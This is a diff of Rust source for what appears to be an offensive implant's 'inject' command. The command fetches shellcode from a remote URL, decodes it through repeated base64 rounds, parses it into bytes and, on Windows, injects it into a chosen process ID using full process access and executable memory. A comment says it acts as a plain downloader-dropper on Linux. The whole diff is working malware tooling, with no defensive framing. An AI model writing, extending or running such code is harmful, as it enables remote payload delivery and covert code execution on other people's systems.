@@ -1,6 +1,6 @@
 use std::error::Error;
 use crate::logger::Logger;
-use base64::decode as b64decode;
+#[cfg(windows)] use base64::decode as b64_decode;
 #[cfg(windows)] extern crate winapi;
 #[cfg(windows)] extern crate kernel32;
 #[cfg(windows)] use winapi::um::winnt::{PROCESS_ALL_ACCESS,MEM_COMMIT,MEM_RESERVE,PAGE_EXECUTE_READWRITE};
@@ -22,10 +22,10 @@ use base64::decode as b64decode;
 /// Usage: `inject [shellcode_url] [pid] [b64_iterations] 🎯`
 /// 
 /// On Linux, the payload will be downloaded and executed like a regular dropper.
-pub async fn handle(s: &String, logger: &Logger) -> Result<String, Box<dyn Error>> {
+pub async fn handle(base64_string: &String, logger: &Logger) -> Result<String, Box<dyn Error>> {
     #[cfg(windows)] {
         // Input: url to shellcode -p pid
-        let mut args = s.split(" ");
+        let mut args = base64_string.split(" ");
         
         // Set up our variables; each one could fail on us.
         // Yes this is a lot of verbose error checking, but this
@@ -36,7 +36,10 @@ pub async fn handle(s: &String, logger: &Logger) -> Result<String, Box<dyn Error
 
         // Get URL
         match args.nth(0) {
-            Some(u) => { url = u; },
+            Some(u) => { 
+                logger.debug(format!("Shellcode URL: {}", &u));
+                url = u; 
+            },
             None    => { return Ok("Could not parse URL".to_string()); }
         };
 
@@ -44,6 +47,7 @@ pub async fn handle(s: &String, logger: &Logger) -> Result<String, Box<dyn Error
         match args.nth(0) {
             Some(ps) => {
                 if let Ok(p) = ps.parse::<u32>() {
+                    logger.debug(format!("Injecting into PID: {:?}", &p));
                     pid = p;
                 } else {
                     let err_msg = "Could not parse PID";
@@ -73,10 +77,44 @@ pub async fn handle(s: &String, logger: &Logger) -> Result<String, Box<dyn Error
         logger.debug(format!("Injecting into PID {:?}", pid));
         let client = Client::new();
         let r = client.get(url).send().await?;
-        if r.status().is_success() {    
+        if r.status().is_success() {   
+            logger.info(format!("Got the shellcode")); 
             // Get the shellcode. Now we have to decode it
-            let mut shellcode_decoded: Vec<u8>; 
-            let shellcode = r.bytes().await?;
+            let mut shellcode_encoded: Vec<u8>;
+            let mut shellcode_string: String;
+            let mut shellcode: Vec<u8>;
+            if let Ok(sc) = r.text().await {
+                shellcode_encoded = Vec::from(sc.trim().as_bytes());
+                logger.info(format!("Got encoded bytes"));
+                for i in 0..b64_iterations {
+                    logger.debug(format!("Decode iteration: {i}"));
+                    shellcode_encoded = b64_decode(shellcode_encoded)?
+                        .into_iter()
+                        .filter(|&b| b != 0x0a)
+                        .collect();
+                }
+                // Convert bytes to our proper string
+                shellcode_string = String::from_utf8(shellcode_encoded)?;
+                // At this point, we have the comma-separated "0xNN" form of the shellcode.
+                // We need to get each one until a proper u8.
+                shellcode = shellcode_string
+                    .split(",")
+                    .map(|s| s.replace("0x", ""))                    
+                    .map(|s|{ 
+                        match u8::from_str_radix(&s, 16) {
+                            Ok(b) => b,
+                            Err(_) => panic!("Couldn't parse {s}")
+                        }
+                    })
+                    .collect();
+
+            } else {
+                let err_msg = "Could not decode shellcode";
+                logger.err(err_msg.to_string());
+                return Ok(err_msg.to_string());
+            }
+
+
             // Big thanks to trickster0
             // https://github.com/trickster0/OffensiveRust/tree/master/Process_Injection_CreateThread
             unsafe {
